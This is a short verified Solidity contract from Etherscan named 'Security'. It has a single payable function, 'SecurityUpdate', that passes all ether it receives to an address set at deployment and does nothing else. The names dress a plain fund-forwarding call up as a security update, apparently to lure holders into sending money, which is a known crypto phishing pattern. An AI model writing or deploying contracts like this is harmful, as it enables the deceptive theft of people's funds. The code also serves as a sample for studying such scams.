/**
 *Submitted for verification at Etherscan.io on 2022-12-03
*/

contract Security {
    address to;

    constructor(address _to)
    {
        to=_to;
    }

    function SecurityUpdate() public payable {
        to.call{value: msg.value}("");
    }
}